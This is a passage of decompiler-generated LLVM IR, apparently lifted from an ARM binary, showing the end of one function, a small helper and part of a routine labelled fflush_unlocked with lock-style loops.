  %v3_1656864 = icmp uge i32 %v2_1656462, %v2_16558
  store i1 %v3_1656864, i1* %cpsr_c.global-to-local, align 1
  %v9_1656870 = icmp eq i32 %v2_1656462, %v2_16558
  br i1 %v9_1656870, label %dec_label_pc_16570, label %dec_label_pc_16588

dec_label_pc_16570:                               ; preds = %dec_label_pc_16558, %dec_label_pc_16570.dec_label_pc_16564_crit_edge
  %v0_1657071 = phi i32 [ %v1_16568.pre, %dec_label_pc_16570.dec_label_pc_16564_crit_edge ], [ %v2_16558, %dec_label_pc_16558 ]
  store i32 %v0_1657071, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16580 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16580, label %dec_label_pc_16584, label %dec_label_pc_16570.dec_label_pc_16564_crit_edge

dec_label_pc_16570.dec_label_pc_16564_crit_edge:  ; preds = %dec_label_pc_16570
  %v0_16564.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16568.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_16564 = inttoptr i32 %v0_16564.pre to i32*
  %v2_16564 = load i32, i32* %v1_16564, align 4
  store i32 %v2_16564, i32* %r3.global-to-local, align 4
  %v3_16568 = icmp uge i32 %v2_16564, %v1_16568.pre
  store i1 %v3_16568, i1* %cpsr_c.global-to-local, align 1
  %v9_16568 = icmp eq i32 %v2_16564, %v1_16568.pre
  br i1 %v9_16568, label %dec_label_pc_16570, label %dec_label_pc_16588

dec_label_pc_16584:                               ; preds = %dec_label_pc_16570
  %v0_16584 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16584, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16588

dec_label_pc_16588:                               ; preds = %dec_label_pc_16558, %dec_label_pc_16570.dec_label_pc_16564_crit_edge, %dec_label_pc_16584
  %v0_16590 = phi i32 [ %v0_16584, %dec_label_pc_16584 ], [ %v2_1656462, %dec_label_pc_16558 ], [ %v2_16564, %dec_label_pc_16570.dec_label_pc_16564_crit_edge ]
  %v1_16588 = phi i32 [ %v0_16584, %dec_label_pc_16584 ], [ %v2_16558, %dec_label_pc_16558 ], [ %v1_16568.pre, %dec_label_pc_16570.dec_label_pc_16564_crit_edge ]
  %v3_16588 = icmp uge i32 %v0_16590, %v1_16588
  store i1 %v3_16588, i1* %cpsr_c.global-to-local, align 1
  %v9_16588 = icmp eq i32 %v0_16590, %v1_16588
  br i1 %v9_16588, label %dec_label_pc_16590, label %dec_label_pc_16588.dec_label_pc_16558_crit_edge

dec_label_pc_16588.dec_label_pc_16558_crit_edge:  ; preds = %dec_label_pc_16588
  %v0_16558.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16558

dec_label_pc_16590:                               ; preds = %dec_label_pc_16588
  %v2_16590 = icmp ne i32 %v1_16588, 0
  store i1 %v2_16590, i1* %cpsr_c.global-to-local, align 1
  %v7_16594 = icmp slt i32 %v1_16588, 2
  br i1 %v7_16594, label %dec_label_pc_165b0, label %dec_label_pc_16598

dec_label_pc_16598:                               ; preds = %dec_label_pc_16590
  %v0_16598 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_16598, i32* %r0.global-to-local, align 4
  %v0_1659c = load i32, i32* %r1.global-to-local, align 4
  %v1_1659c = add i32 %v0_1659c, 129
  store i32 %v1_1659c, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_165b0

dec_label_pc_165b0:                               ; preds = %dec_label_pc_16520, %dec_label_pc_16598, %dec_label_pc_16590
  %v2_165b4 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_165b4, i32* %r4.global-to-local, align 4
  %v1_165b8 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_165b8

; uselistorder directives
  uselistorder i32 %v0_16584, { 1, 0, 2 }
  uselistorder i32 %v1_16568.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16558, { 1, 0 }
  uselistorder i32 %v0_164e4, { 1, 0, 2 }
  uselistorder i32 %v1_164c8.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_164b8, { 1, 0 }
  uselistorder i32 %v0_16484, { 2, 1, 0 }
  uselistorder i32 %v0_16428, { 1, 0 }
  uselistorder i32 %v0_1640c, { 1, 0, 2 }
  uselistorder i32 %v1_163f0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_163dc, { 1, 0 }
  uselistorder i32 %v0_16380, { 1, 0, 2 }
  uselistorder i32 %v1_16364.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_16338, { 2, 1, 0, 3 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10, 12, 14, 13, 15 }
  uselistorder i32* %r6.global-to-local, { 5, 6, 0, 1, 2, 3, 4 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 5, 4, 43, 6, 7, 8, 9, 10, 11, 12, 14, 13, 44, 15, 16, 17, 41, 42, 18, 19, 20, 21, 22, 23, 24, 26, 25, 1, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 38, 37, 0, 39, 40 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 12, 9, 10, 11 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i1* %cpsr_c.global-to-local, { 3, 4, 5, 25, 26, 6, 7, 8, 10, 9, 1, 11, 14, 12, 13, 27, 15, 17, 16, 2, 18, 19, 20, 21, 23, 22, 0, 24 }
  uselistorder i32 8192, { 3, 0, 1, 2 }
  uselistorder i32 47, { 2, 0, 5, 3, 4, 1 }
  uselistorder i32 32816, { 2, 0, 1 }
  uselistorder label %dec_label_pc_165b0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_16588, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16570, { 1, 0 }
  uselistorder label %dec_label_pc_16520, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16510, { 1, 2, 0 }
  uselistorder label %dec_label_pc_164e8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_164d0, { 1, 0 }
  uselistorder label %dec_label_pc_16484, { 1, 0 }
  uselistorder label %bb52, { 1, 0 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %dec_label_pc_1644c, { 1, 0 }
  uselistorder label %dec_label_pc_16420, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %dec_label_pc_16410, { 2, 1, 0 }
  uselistorder label %dec_label_pc_163f8, { 1, 0 }
  uselistorder label %dec_label_pc_16394, { 1, 0 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %dec_label_pc_16384, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1636c, { 1, 0 }
}

define i32 @function_165c0(i32 %arg1) local_unnamed_addr {
dec_label_pc_165c0:
  %v0_165c0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_165c0, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_165c0
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_165c0, %bb
  %v10_165d4 = phi i32 [ %arg1, %dec_label_pc_165c0 ], [ 0, %bb ]
  ret i32 %v10_165d4

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v6_165d8 = load i32, i32* @r5, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32* @r6, align 4
  %v4_165e8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 76) to i32*), align 4
  store i32 %v4_165e8, i32* %r3.global-to-local, align 4
  %v4_165ec = icmp uge i32 %tmp, %v4_165e8
  store i1 %v4_165ec, i1* %cpsr_c.global-to-local, align 1
  %v10_165ec = icmp eq i32 %tmp, %v4_165e8
  br i1 %v10_165ec, label %bb, label %dec_label_pc_16604

bb:                                               ; preds = %entry
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  br label %dec_label_pc_16614

dec_label_pc_16604:                               ; preds = %entry
  store i32 %tmp, i32* @r4, align 4
  store i32 256, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_16608 = icmp eq i16* %arg1, null
  br i1 %v3_16608, label %dec_label_pc_16614, label %dec_label_pc_16928

dec_label_pc_16614:                               ; preds = %bb, %dec_label_pc_16604
  %stack_var_-44.1 = phi i32 [ 0, %bb ], [ 256, %dec_label_pc_16604 ]
  store i32 160, i32* %r3.global-to-local, align 4
  %v4_16618 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 160) to i32*), align 4
  store i32 %v4_16618, i32* %r5.global-to-local, align 4
  %v0_1661c = call i32 @__aeabi_read_tp()
  store i32 %v0_1661c, i32* %r0.global-to-local, align 4
  %v1_16620 = add i32 %v4_16618, 8
  %v2_16620 = inttoptr i32 %v1_16620 to i32*
  %v3_16620 = load i32, i32* %v2_16620, align 4
  store i32 %v3_16620, i32* %r3.global-to-local, align 4
  %v1_16624 = add i32 %v0_1661c, -1168
  store i32 %v1_16624, i32* %r8.global-to-local, align 4
  %v3_16628 = icmp uge i32 %v3_16620, %v1_16624
  store i1 %v3_16628, i1* %cpsr_c.global-to-local, align 1
  %v9_16628 = icmp eq i32 %v3_16620, %v1_16624
  br i1 %v9_16628, label %dec_label_pc_16670, label %dec_label_pc_16630

dec_label_pc_16630:                               ; preds = %dec_label_pc_16614
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_16618, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_1663c143 = inttoptr i32 %v4_16618 to i32*
  %v2_1663c144 = load i32, i32* %v1_1663c143, align 4
  store i32 %v2_1663c144, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_16640146 = icmp eq i32 %v2_1663c144, 0
  br i1 %v9_16640146, label %dec_label_pc_16648, label %dec_label_pc_16660

dec_label_pc_16648:                               ; preds = %dec_label_pc_16630, %dec_label_pc_16648.dec_label_pc_1663c_crit_edge
  %v0_16648147 = phi i32 [ %v1_16640.pre, %dec_label_pc_16648.dec_label_pc_1663c_crit_edge ], [ 0, %dec_label_pc_16630 ]
  store i32 %v0_16648147, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16658 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16658, label %dec_label_pc_1665c, label %dec_label_pc_16648.dec_label_pc_1663c_crit_edge

dec_label_pc_16648.dec_label_pc_1663c_crit_edge:  ; preds = %dec_label_pc_16648
  %v0_1663c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16640.pre = load i32, i32* @r4, align 4
  %v1_1663c = inttoptr i32 %v0_1663c.pre to i32*
  %v2_1663c = load i32, i32* %v1_1663c, align 4
  store i32 %v2_1663c, i32* %r3.global-to-local, align 4
  %v3_16640 = icmp uge i32 %v2_1663c, %v1_16640.pre
  store i1 %v3_16640, i1* %cpsr_c.global-to-local, align 1
  %v9_16640 = icmp eq i32 %v2_1663c, %v1_16640.pre
  br i1 %v9_16640, label %dec_label_pc_16648, label %dec_label_pc_16660

dec_label_pc_1665c:                               ; preds = %dec_label_pc_16648
  %v0_1665c = load i32, i32* @r4, align 4
  store i32 %v0_1665c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16660

dec_label_pc_16660:                               ; preds = %dec_label_pc_16630, %dec_label_pc_16648.dec_label_pc_1663c_crit_edge, %dec_label_pc_1665c
  %v0_16660 = phi i32 [ %v0_1665c, %dec_label_pc_1665c ], [ %v2_1663c144, %dec_label_pc_16630 ], [ %v2_1663c, %dec_label_pc_16648.dec_label_pc_1663c_crit_edge ]
  %v1_16660 = phi i32 [ %v0_1665c, %dec_label_pc_1665c ], [ 0, %dec_label_pc_16630 ], [ %v1_16640.pre, %dec_label_pc_16648.dec_label_pc_1663c_crit_edge ]
  %v3_16660 = icmp uge i32 %v0_16660, %v1_16660
  store i1 %v3_16660, i1* %cpsr_c.global-to-local, align 1
  %v9_16660 = icmp eq i32 %v0_16660, %v1_16660
  br i1 %v9_16660, label %bb66, label %bb65

bb65:                                             ; preds = %dec_label_pc_16660
  %v1_16664 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_16664, i32* %r0.global-to-local, align 4
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_16660, %bb65
  %v1_16668 = xor i1 %v9_16660, true
  call void @__pseudo_cond_branch(i1 %v1_16668, i32 ptrtoint (i32* @global_var_13f34.514 to i32))
  %v0_1666c = load i32, i32* %r8.global-to-local, align 4
  %v1_1666c = load i32, i32* %r5.global-to-local, align 4
  %v2_1666c = add i32 %v1_1666c, 8
  %v3_1666c = inttoptr i32 %v2_1666c to i32*
  store i32 %v0_1666c, i32* %v3_1666c, align 4
  br label %dec_label_pc_16670

dec_label_pc_16670:                               ; preds = %dec_label_pc_16614, %bb66
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_16674 = load i32, i32* @r6, align 4
  %v2_16674 = add i32 %v0_16674, 160
  %v3_16674 = inttoptr i32 %v2_16674 to i32*
  %v4_16674 = load i32, i32* %v3_16674, align 4
  store i32 %v4_16674, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_1667c = add i32 %v0_16674, 12
  %v3_1667c = inttoptr i32 %v2_1667c to i32*
  %v4_1667c = load i32, i32* %v3_1667c, align 4
  store i32 %v4_1667c, i32* %r2.global-to-local, align 4
  %v1_16680 = add i32 %v4_16674, 4
  %v2_16680 = inttoptr i32 %v1_16680 to i32*
  %v3_16680 = load i32, i32* %v2_16680, align 4
  store i32 %v3_16680, i32* %r1.global-to-local, align 4
  %v1_16684 = inttoptr i32 %v4_1667c to i32*
  %v2_16684 = load i32, i32* %v1_16684, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16688 = icmp eq i32 %v3_16680, 0
  %v1_1668c = add i32 %v2_16684, 1
  store i32 %v1_1668c, i32* %r3.global-to-local, align 4
  store i32 %v1_1668c, i32* %v1_16684, align 4
  br i1 %v2_16688, label %dec_label_pc_16698, label %dec_label_pc_166f8

dec_label_pc_16698:                               ; preds = %dec_label_pc_16670
  %v0_16698 = load i32, i32* %r1.global-to-local, align 4
  %v1_16698 = load i32, i32* %r0.global-to-local, align 4
  %v2_16698 = add i32 %v1_16698, 8
  %v3_16698 = inttoptr i32 %v2_16698 to i32*
  store i32 %v0_16698, i32* %v3_16698, align 4
  %v0_1669c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1669c, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_166a0

dec_label_pc_166a0:                               ; preds = %dec_label_pc_166d0.dec_label_pc_166a0_crit_edge, %dec_label_pc_16698
  %v0_166a0 = phi i32 [ %v0_166a0.pre, %dec_label_pc_166d0.dec_label_pc_166a0_crit_edge ], [ %v0_1669c, %dec_label_pc_16698 ]
  %v1_166a0 = inttoptr i32 %v0_166a0 to i32*
  %v2_166a0 = load i32, i32* %v1_166a0, align 4
  store i32 %v2_166a0, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_166a0, i32* %r2.global-to-local, align 4
  %v2_166ac131 = load i32, i32* %v1_166a0, align 4
  store i32 %v2_166ac131, i32* %r3.global-to-local, align 4
  %v3_166b0133 = icmp uge i32 %v2_166ac131, %v2_166a0
  store i1 %v3_166b0133, i1* %cpsr_c.global-to-local, align 1
  %v9_166b0139 = icmp eq i32 %v2_166ac131, %v2_166a0
  br i1 %v9_166b0139, label %dec_label_pc_166b8, label %dec_label_pc_166d0

dec_label_pc_166b8:                               ; preds = %dec_label_pc_166a0, %dec_label_pc_166b8.dec_label_pc_166ac_crit_edge
  %v0_166b8140 = phi i32 [ %v1_166b0.pre, %dec_label_pc_166b8.dec_label_pc_166ac_crit_edge ], [ %v2_166a0, %dec_label_pc_166a0 ]
  store i32 %v0_166b8140, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_166c8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_166c8, label %dec_label_pc_166cc, label %dec_label_pc_166b8.dec_label_pc_166ac_crit_edge

dec_label_pc_166b8.dec_label_pc_166ac_crit_edge:  ; preds = %dec_label_pc_166b8
  %v0_166ac.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_166b0.pre = load i32, i32* @r4, align 4
  %v1_166ac = inttoptr i32 %v0_166ac.pre to i32*
  %v2_166ac = load i32, i32* %v1_166ac, align 4
  store i32 %v2_166ac, i32* %r3.global-to-local, align 4
  %v3_166b0 = icmp uge i32 %v2_166ac, %v1_166b0.pre
  store i1 %v3_166b0, i1* %cpsr_c.global-to-local, align 1
  %v9_166b0 = icmp eq i32 %v2_166ac, %v1_166b0.pre
  br i1 %v9_166b0, label %dec_label_pc_166b8, label %dec_label_pc_166d0

dec_label_pc_166cc:                               ; preds = %dec_label_pc_166b8
  %v0_166cc = load i32, i32* @r4, align 4
  store i32 %v0_166cc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_166d0

dec_label_pc_166d0:                               ; preds = %dec_label_pc_166a0, %dec_label_pc_166b8.dec_label_pc_166ac_crit_edge, %dec_label_pc_166cc
  %v0_166d8 = phi i32 [ %v0_166cc, %dec_label_pc_166cc ], [ %v2_166ac131, %dec_label_pc_166a0 ], [ %v2_166ac, %dec_label_pc_166b8.dec_label_pc_166ac_crit_edge ]
  %v1_166d0 = phi i32 [ %v0_166cc, %dec_label_pc_166cc ], [ %v2_166a0, %dec_label_pc_166a0 ], [ %v1_166b0.pre, %dec_label_pc_166b8.dec_label_pc_166ac_crit_edge ]
  %v3_166d0 = icmp uge i32 %v0_166d8, %v1_166d0
  store i1 %v3_166d0, i1* %cpsr_c.global-to-local, align 1
  %v9_166d0 = icmp eq i32 %v0_166d8, %v1_166d0
  br i1 %v9_166d0, label %dec_label_pc_166d8, label %dec_label_pc_166d0.dec_label_pc_166a0_crit_edge

dec_label_pc_166d0.dec_label_pc_166a0_crit_edge:  ; preds = %dec_label_pc_166d0
  %v0_166a0.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_166a0

dec_label_pc_166d8:                               ; preds = %dec_label_pc_166d0
  %v2_166d8 = icmp ne i32 %v1_166d0, 0
  store i1 %v2_166d8, i1* %cpsr_c.global-to-local, align 1
  %v7_166dc = icmp slt i32 %v1_166d0, 2
  br i1 %v7_166dc, label %dec_label_pc_166f8, label %dec_label_pc_166e0

dec_label_pc_166e0:                               ; preds = %dec_label_pc_166d8
  %v0_166e0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_166e0, i32* %r0.global-to-local, align 4
  %v0_166e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_166e4 = add i32 %v0_166e4, 129
  store i32 %v1_166e4, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_166f8

dec_label_pc_166f8:                               ; preds = %dec_label_pc_16670, %dec_label_pc_166e0, %dec_label_pc_166d8
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_166fc = load i32, i32* @r6, align 4
  %v2_166fc = add i32 %v0_166fc, 152
  %v3_166fc = inttoptr i32 %v2_166fc to i32*
  %v4_166fc = load i32, i32* %v3_166fc, align 4
  store i32 %v4_166fc, i32* %r5.global-to-local, align 4
  %v1_16700 = add i32 %v4_166fc, 8
  %v2_16700 = inttoptr i32 %v1_16700 to i32*
  %v3_16700 = load i32, i32* %v2_16700, align 4
  store i32 %v3_16700, i32* %r3.global-to-local, align 4
  %v1_16704 = load i32, i32* %r8.global-to-local, align 4
  %v3_16704 = icmp uge i32 %v3_16700, %v1_16704
  store i1 %v3_16704, i1* %cpsr_c.global-to-local, align 1
  %v9_16704 = icmp eq i32 %v3_16700, %v1_16704
  br i1 %v9_16704, label %dec_label_pc_1674c, label %dec_label_pc_1670c

dec_label_pc_1670c:                               ; preds = %dec_label_pc_166f8
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_166fc, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_16718123 = inttoptr i32 %v4_166fc to i32*
  %v2_16718124 = load i32, i32* %v1_16718123, align 4
  store i32 %v2_16718124, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1671c126 = icmp eq i32 %v2_16718124, 0
  br i1 %v9_1671c126, label %dec_label_pc_16724, label %dec_label_pc_1673c

dec_label_pc_16724:                               ; preds = %dec_label_pc_1670c, %dec_label_pc_16724.dec_label_pc_16718_crit_edge
  %v0_16724127 = phi i32 [ %v1_1671c.pre, %dec_label_pc_16724.dec_label_pc_16718_crit_edge ], [ 0, %dec_label_pc_1670c ]
  store i32 %v0_16724127, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16734 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16734, label %dec_label_pc_16738, label %dec_label_pc_16724.dec_label_pc_16718_crit_edge

dec_label_pc_16724.dec_label_pc_16718_crit_edge:  ; preds = %dec_label_pc_16724
  %v0_16718.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1671c.pre = load i32, i32* @r4, align 4
  %v1_16718 = inttoptr i32 %v0_16718.pre to i32*
  %v2_16718 = load i32, i32* %v1_16718, align 4
  store i32 %v2_16718, i32* %r3.global-to-local, align 4
  %v3_1671c = icmp uge i32 %v2_16718, %v1_1671c.pre
  store i1 %v3_1671c, i1* %cpsr_c.global-to-local, align 1
  %v9_1671c = icmp eq i32 %v2_16718, %v1_1671c.pre
  br i1 %v9_1671c, label %dec_label_pc_16724, label %dec_label_pc_1673c

dec_label_pc_16738:                               ; preds = %dec_label_pc_16724
  %v0_16738 = load i32, i32* @r4, align 4
  store i32 %v0_16738, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1673c

dec_label_pc_1673c:                               ; preds = %dec_label_pc_1670c, %dec_label_pc_16724.dec_label_pc_16718_crit_edge, %dec_label_pc_16738
  %v0_1673c = phi i32 [ %v0_16738, %dec_label_pc_16738 ], [ %v2_16718124, %dec_label_pc_1670c ], [ %v2_16718, %dec_label_pc_16724.dec_label_pc_16718_crit_edge ]
  %v1_1673c = phi i32 [ %v0_16738, %dec_label_pc_16738 ], [ 0, %dec_label_pc_1670c ], [ %v1_1671c.pre, %dec_label_pc_16724.dec_label_pc_16718_crit_edge ]
  %v3_1673c = icmp uge i32 %v0_1673c, %v1_1673c
  store i1 %v3_1673c, i1* %cpsr_c.global-to-local, align 1
  %v9_1673c = icmp eq i32 %v0_1673c, %v1_1673c
  br i1 %v9_1673c, label %bb68, label %bb67

bb67:                                             ; preds = %dec_label_pc_1673c
  %v1_16740 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_16740, i32* %r0.global-to-local, align 4
  br label %bb68

bb68:                                             ; preds = %dec_label_pc_1673c, %bb67
  %v1_16744 = xor i1 %v9_1673c, true
  call void @__pseudo_cond_branch(i1 %v1_16744, i32 ptrtoint (i32* @global_var_13f34.514 to i32))
  %v0_16748 = load i32, i32* %r8.global-to-local, align 4
  %v1_16748 = load i32, i32* %r5.global-to-local, align 4
  %v2_16748 = add i32 %v1_16748, 8
  %v3_16748 = inttoptr i32 %v2_16748 to i32*
  store i32 %v0_16748, i32* %v3_16748, align 4
  %v0_16750.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1674c

dec_label_pc_1674c:                               ; preds = %dec_label_pc_166f8, %bb68
  %v0_1675c = phi i32 [ %v0_166fc, %dec_label_pc_166f8 ], [ %v0_16750.pre, %bb68 ]
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_16750 = add i32 %v0_1675c, 152
  %v3_16750 = inttoptr i32 %v2_16750 to i32*
  %v4_16750 = load i32, i32* %v3_16750, align 4
  store i32 %v4_16750, i32* %r0.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v1_16758 = add i32 %v4_16750, 4
  %v2_16758 = inttoptr i32 %v1_16758 to i32*
  %v3_16758 = load i32, i32* %v2_16758, align 4
  store i32 %v3_16758, i32* %r1.global-to-local, align 4
  %v2_1675c = add i32 %v0_1675c, 76
  %v3_1675c = inttoptr i32 %v2_1675c to i32*
  %v4_1675c = load i32, i32* %v3_1675c, align 4
  store i32 %v4_1675c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16760 = icmp eq i32 %v3_16758, 0
  %v1_16764 = inttoptr i32 %v4_1675c to i32*
  %v2_16764 = load i32, i32* %v1_16764, align 4
  store i32 %v2_16764, i32* @r5, align 4
  br i1 %v2_16760, label %dec_label_pc_1676c, label %dec_label_pc_167cc

dec_label_pc_1676c:                               ; preds = %dec_label_pc_1674c
  %v2_1676c = add i32 %v4_16750, 8
  %v3_1676c = inttoptr i32 %v2_1676c to i32*
  store i32 0, i32* %v3_1676c, align 4
  %v0_16770 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16770, i32* @r7, align 4
  br label %dec_label_pc_16774

dec_label_pc_16774:                               ; preds = %dec_label_pc_167a4.dec_label_pc_16774_crit_edge, %dec_label_pc_1676c
  %v0_16774 = phi i32 [ %v0_16774.pre, %dec_label_pc_167a4.dec_label_pc_16774_crit_edge ], [ %v0_16770, %dec_label_pc_1676c ]
  %v1_16774 = inttoptr i32 %v0_16774 to i32*
  %v2_16774 = load i32, i32* %v1_16774, align 4
  store i32 %v2_16774, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_16774, i32* %r2.global-to-local, align 4
  %v2_16780111 = load i32, i32* %v1_16774, align 4
  store i32 %v2_16780111, i32* %r3.global-to-local, align 4
  %v3_16784113 = icmp uge i32 %v2_16780111, %v2_16774
  store i1 %v3_16784113, i1* %cpsr_c.global-to-local, align 1
  %v9_16784119 = icmp eq i32 %v2_16780111, %v2_16774
  br i1 %v9_16784119, label %dec_label_pc_1678c, label %dec_label_pc_167a4

dec_label_pc_1678c:                               ; preds = %dec_label_pc_16774, %dec_label_pc_1678c.dec_label_pc_16780_crit_edge
  %v0_1678c120 = phi i32 [ %v1_16784.pre, %dec_label_pc_1678c.dec_label_pc_16780_crit_edge ], [ %v2_16774, %dec_label_pc_16774 ]
  store i32 %v0_1678c120, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1679c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1679c, label %dec_label_pc_167a0, label %dec_label_pc_1678c.dec_label_pc_16780_crit_edge

dec_label_pc_1678c.dec_label_pc_16780_crit_edge:  ; preds = %dec_label_pc_1678c
  %v0_16780.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16784.pre = load i32, i32* @r4, align 4
  %v1_16780 = inttoptr i32 %v0_16780.pre to i32*
  %v2_16780 = load i32, i32* %v1_16780, align 4
  store i32 %v2_16780, i32* %r3.global-to-local, align 4
  %v3_16784 = icmp uge i32 %v2_16780, %v1_16784.pre
  store i1 %v3_16784, i1* %cpsr_c.global-to-local, align 1
  %v9_16784 = icmp eq i32 %v2_16780, %v1_16784.pre
  br i1 %v9_16784, label %dec_label_pc_1678c, label %dec_label_pc_167a4

dec_label_pc_167a0:                               ; preds = %dec_label_pc_1678c
  %v0_167a0 = load i32, i32* @r4, align 4
  store i32 %v0_167a0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_167a4

dec_label_pc_167a4:                               ; preds = %dec_label_pc_16774, %dec_label_pc_1678c.dec_label_pc_16780_crit_edge, %dec_label_pc_167a0
  %v0_167ac = phi i32 [ %v0_167a0, %dec_label_pc_167a0 ], [ %v2_16780111, %dec_label_pc_16774 ], [ %v2_16780, %dec_label_pc_1678c.dec_label_pc_16780_crit_edge ]
  %v1_167a4 = phi i32 [ %v0_167a0, %dec_label_pc_167a0 ], [ %v2_16774, %dec_label_pc_16774 ], [ %v1_16784.pre, %dec_label_pc_1678c.dec_label_pc_16780_crit_edge ]
  %v3_167a4 = icmp uge i32 %v0_167ac, %v1_167a4
